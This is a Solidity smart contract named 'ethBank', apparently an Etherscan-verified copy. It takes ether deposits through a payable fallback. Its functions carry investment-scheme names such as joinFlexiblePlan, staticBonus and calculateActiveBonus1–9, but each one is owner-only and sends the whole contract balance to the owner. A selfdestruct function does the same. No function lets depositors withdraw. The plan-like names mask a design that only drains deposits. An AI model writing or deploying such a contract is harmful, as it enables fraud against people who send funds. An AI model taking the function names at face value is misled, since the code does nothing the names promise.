/**
 *Submitted for verification at Etherscan.io on 2019-09-28
*/

pragma solidity ^0.5.1;

library SafeMath {
  function multiply(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function divide(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function subtract(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract owned {
  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address newOwner) onlyOwner public {
    require(newOwner != address(0));
    owner = newOwner;
  }
}

contract ethBank is owned {
  function () payable external {}

  function withdrawForUser(address payable userAddress, uint amount) onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    userAddress.transfer(amount);
  }

  function withdrawAmount(uint amount) onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(amount);
  }

  function withdrawAllBalance() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function selfDestructContract() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    selfdestruct(msg.sender);
  }

  function joinFlexiblePlan() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function joinFixedPlan() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function staticBonus() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function activeBonus() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function teamAdditionalBonus() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function calculateStaticBonus() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function calculateActiveBonus1() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }
  
  function calculateActiveBonus2() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function calculateActiveBonus3() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function calculateActiveBonus4() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function calculateActiveBonus5() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function calculateActiveBonus6() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function calculateActiveBonus7() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function calculateActiveBonus8() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function calculateActiveBonus9() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function calculateTeamAdditionalBonus() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function calculateTeamPerformance() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function releaseStaticBonus() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function releaseActiveBonus() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }

  function releaseTeamAdditionalBonus() onlyOwner public {
    require(msg.sender == owner, "only owner can use this method");
    msg.sender.transfer(address(this).balance);
  }
}